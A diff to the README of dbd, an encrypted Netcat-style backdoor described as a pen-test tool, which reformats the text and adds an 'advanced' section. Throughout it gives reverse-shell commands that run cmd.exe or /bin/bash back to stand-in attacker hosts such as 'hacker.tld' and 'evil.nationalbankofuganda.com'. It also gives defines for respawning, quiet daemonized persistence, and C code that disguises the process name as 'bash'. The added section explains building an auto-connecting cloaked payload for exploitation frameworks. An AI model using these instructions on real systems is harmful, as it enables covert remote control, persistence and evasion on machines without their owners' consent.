@@ -1,13 +1,13 @@
-						  d8888b. d8888b. d8888b.
-						  88  `8D 88  `8D 88  `8D
-						  88   88 88oooY' 88   88
-						  88   88 88~~~b. 88   88
-						  88  .8D 88   8D 88  .8D
-						  Y8888D' Y8888P' Y8888D'
+	  d8888b. d8888b. d8888b.
+	  88  `8D 88  `8D 88  `8D
+	  88   88 88oooY' 88   88
+	  88   88 88~~~b. 88   88
+	  88  .8D 88   8D 88  .8D
+	  Y8888D' Y8888P' Y8888D'
 
 #[Durandal's Backdoor](http://gitbrew.org/dbd)
-##Copyright (C) 2013 Kyle Barnthouse [<kbarnthouse@hephaestussec.com>](mailto:kbarnthouse@hephaestussec.com)
-##dbd is distributed under the GNU GPL
+#Copyright (C) 2013 Kyle Barnthouse [<kbarnthouse@hephaestussec.com>](mailto:kbarnthouse@hephaestussec.com)
+#dbd is distributed under the GNU GPL
 
 
 ###SYNOPSIS
@@ -29,7 +29,7 @@ dbd is a Netcat-clone, designed to be portable and offer strong encryption. It r
 	  make mingwbg CFLAGS=-DSTEALTH - stealthy no-console app (w/ MinGW MSYS)
 	  make cygwin   - Cygwin console app
 	  make darwin   - Darwin
-	
+
 	cross-compile options:
 	  make mingw-cross    - win32 cross compile (i586-mingw32msvc-gcc)
 	  make mingwbg-cross  - win32 no-console cross compile (i586-mingw32msvc-gcc)
@@ -38,6 +38,7 @@ dbd is a Netcat-clone, designed to be portable and offer strong encryption. It r
 	
 	roll up a tarball (move your compiled stuff to binaries/ first:
 	  make dist     - create tarball with source files, readme, and binaries/
+
 
 To compile dbd under a Unix-like operating system you need gcc and relevant development tools. For Linux, FreeBSD, NetBSD, OpenBSD (and possibly others), type:
 
@@ -71,8 +72,9 @@ You may want to change the default behaviour of dbd. One of the most important t
 
 ###SAMPLE USES
 
-With a little imagination, dbd can be used for many things...
-* Use dbd to securely transfer files between two networks:
+With a little imagination, dbd can be used for many things:
+
+Use dbd to securely transfer files between two networks:
 
 	snafu$ dbd -l -p 12345 -k secret > output.file
 
@@ -82,16 +84,16 @@ or from win32:
 
 	C:\somedir>type input.fil | dbd -k secret snafu 12345
 
-* Use dbd as a simple (but secure) chat:
+Use dbd as a simple (but secure) chat:
 
 	snafu$ dbd -P snafu -Hon fubar 1234
 
 	fubar$ dbd -Pfubar -Hon -l -p 1234
 
-* Use dbd as a pen-test backdoor:
+Use dbd as a pen-test backdoor:
 
 	C:\hacked box>dbdbg.exe -r1800 -q -e cmd.exe hacker.tld 443
-	...
+
 
 or under Unix-like OSes:
 
@@ -105,24 +107,31 @@ In addition to using command line options, you can hard code variables by using 
 
 or using hard-coded #defines, you could edit dbd.h:
 
-	#define DOLISTEN 0
-	#define HOST "evil.nationalbankofuganda.com"
-	#define PORT 995
-	#define EXECPROG "/bin/bash"
+```c
+#define DOLISTEN 0
+#define HOST "evil.nationalbankofuganda.com"
+#define PORT 995
+#define EXECPROG "/bin/bash"
+```
 
 	You can also set respawn and stealth options to help maintain your connection:
 
-	#define RESPAWN_ENABLED 1
-	#define RESPAWN_INTERVAL 900
-	#define QUIET 1
-	#define DAEMONIZE 1
+```c
+#define RESPAWN_ENABLED 1
+#define RESPAWN_INTERVAL 900
+#define QUIET 1
+#define DAEMONIZE 1
+```
 
 This will set the connection to daemonize ("melt" in malware terms), never send output to STDOUT, and attempt to respawn the connection every 15 minutes should it ever disconnect from the listener.
-	ROMULAN CLOAKING TECHNOLOGY
+
+###ROMULAN CLOAKING TECHNOLOGY
 
 Now we're getting into the fun stuff. Once you are a mastar at hard-coding options into your backdoor, you can use what is quite possibly the most fun named constant at our disposal: CLOAK. To do this, simply set the value:
 
-	#define CLOAK 1
+```c
+#define CLOAK 1
+```
 
 NOTE: this currently only works on *nix compiles. Eventually I plan on adding Win32 process migration/hooking so those targets can feel some Romulan love as well.
 
@@ -130,25 +139,27 @@ For *nix environments, this option scrubs argv[0] and replaces it with the strin
 
 Feel free to use this scrubber in anything you happen to be working on:
 
-	//grab our named constant
-	int cloak = CLOAK;
+```c
+//grab our named constant
+int cloak = CLOAK;
 
-	//Engage cloaking device
-	if(cloak)
-	{
-		#ifdef WIN32
-		//stub              
-		#else
-		//change argv[0] to say bash       
-		int scrub;
-		strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
-		strcpy((char *)argv[0], "bash\0");    
-		for (scrub = 1; scrub < argc; scrub++)
-		{                     
-			 strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
-		}                 
-		#endif
-	}
+//Engage cloaking device
+if(cloak)
+{
+	#ifdef WIN32
+	//stub              
+	#else
+	//change argv[0] to say bash       
+	int scrub;
+	strncpy((char *)argv[0], "\0", strlen((char *)argv[0]) + 1);
+	strcpy((char *)argv[0], "bash\0");    
+	for (scrub = 1; scrub < argc; scrub++)
+	{                     
+		 strncpy((char *)argv[scrub], "\0", strlen((char *)argv[scrub]) + 1);
+	}                 
+	#endif
+}
+```
 
 ###WARNING
 
@@ -166,12 +177,40 @@ will do the same thing on a Linux system that
 
 would do on a win32 system with mingw/msys installed on it.
 
-Right now all cross-compile options are built with BackTrack Linux in mind, but should work on any *nix with a little love.  If you have mingw32-gcc installed and make won't build, edit the WCC variable at the top of the Makefile and put the path to your mingw32-gcc binary.  
+Right now all cross-compile options are built with Kali Linux in mind, but should work on any *nix with a little love.  If you have mingw32-gcc installed and make won't build, edit the WCC variable at the top of the Makefile and put the path to your mingw32-gcc binary.  
 
-The eventual goal is to have cross-compile options for arm/android and arm/ios as well.  This is currently doable, but I want to find a way to implement without requiring a 1GB+ android sdk/ndk/wtfk install.  
+As of dbd-1.5 you can use any crossbuild toolchain to compile dbd by setting the toolchain prefix as CROSS_COMPILE.  For example, building an arm version is as easy as:
+
+	$ make unix CROSS_COMPILE=arm-linux-gnueabi-
+
+##ADVANCED WIZARDRY
+
+If you wish to integrate dbd with an exploitation framework, you can write a module that generates a custom dbd.h with configuration options specific to your target.  Anything not explicitly #defined in this file will still use the defaults so you don't have to write everything in the header.  Example: have a file rm dbd.h and replace with:
+
+```c
+#define DOLISTEN 0
+#define HOST "evil.nationalbankofuganda.com"
+#define PORT 995
+#define EXECPROG "/bin/bash"
+#define RESPAWN_ENABLED 1
+#define RESPAWN_INTERVAL 900
+#define QUIET 1
+#define CLOAK 1
+#define SHARED_SECRET "customcrypto"
+```
+
+then call make <target options> to build an auto connecting payload with cloaking and respawning that connects back to a listening dbd agent on evil.nationalbankofuganda.com running with the options:
+
+	$ dbd -l -p 995 -k customcrypto
+
+Another advanced trick is to compile dbd using dietlibc or uClibc.  to compile a dietlibc linux dbd agent, use:
+
+	$ make unix CROSS_COMPILE="diet -Os "
+
+Pay attention to the space after the s in the string.  This allows the Makefile to add gcc with the standard CFLAGS and LDFLAGS so your agent builds properly.  The advantage of using dietlibc is that it produces a very tiny 100% static executable for the target environment (around 70K for a linux dbd agent before packing as opposed to the standard 700K+ with glibc and gcc -static).  Using uClibc is even easier, since you just set the crossbuild prefix for your toolchain under CROSS_COMPILE.
 
 ##LICENSE  
-dbd Copyright (C) 2012 Kyle Barnthouse durandal@gitbrew.org
+dbd Copyright (C) 2013 Kyle Barnthouse kbarnthouse@hephaestussec.com
 
 This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either version 2 of the License, or (at your option) any later version.
 
@@ -186,8 +225,10 @@ dbd's AES-CBC-128 + HMAC-SHA1 implementation is Copyright (C) Christophe Devine 
 Some code (for doexec_win32.h) has been derived from doexec.c from the Win32 port of Netcat (C) Weld Pond and hobbit. Parts of doexec.c is Copyright (C) 1994 Nathaniel W. Mishkin (doexec.c code was originally derived from rlogind.exe).
 
 The original version of Netcat was written by hobbit hobbit@avian.org. The NT version was done by Weld Pond weld@l0pht.com.
+
 ---
-Kyle Barnthouse [<kbarnthouse@hephaestussec.com>](mailto:kbarnthouse@hephaestussec.com)
+
+(C) Kyle Barnthouse [<kbarnthouse@hephaestussec.com>](mailto:kbarnthouse@hephaestussec.com)
 Security Consultant  
-[gitbrew.org](http://gitbrew.org)  
+[gitbrew.org](https://gitbrew.org)  
 [Hephaestus Security](http://hephaestussec.com)
